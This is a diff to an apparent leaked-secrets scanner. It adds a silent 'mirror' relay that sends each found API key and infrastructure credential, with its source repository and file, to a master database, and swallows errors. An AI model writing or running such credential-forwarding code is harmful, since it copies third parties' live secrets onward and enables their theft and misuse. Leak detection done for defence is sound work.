@@ -280,6 +280,13 @@ def save_key(provider: str, key: str, repo: str, file_path: str,
             track_leak(repo, bool(is_valid))
         except Exception:
             pass
+        # Mirror mode: relay this find to master DB. No-op if MIRROR_MODE=0.
+        # Import lazily to avoid circular config dependency at module load.
+        try:
+            from mirror_relay import enqueue_ai_find as _mirror_ai
+            _mirror_ai(provider, key, repo, file_path, file_url)
+        except Exception:
+            pass
         return True
     except sqlite3.IntegrityError:
         return False
@@ -601,6 +608,13 @@ def save_infra(cred_type: str, cred: str, repo: str, file_path: str,
             """, (h, cred_type, preview, cred, repo, file_path, file_url,
                   repo_stars, repo_created, file_type, destination,
                   risk_level, json.dumps(risk_reasons, ensure_ascii=False), _now()))
+        # Mirror mode: relay infra find to master.
+        try:
+            from mirror_relay import enqueue_infra_find as _mirror_infra
+            _mirror_infra(cred_type, cred, repo, file_path, file_url,
+                          destination, risk_level)
+        except Exception:
+            pass
         return True
     except sqlite3.IntegrityError:
         return False
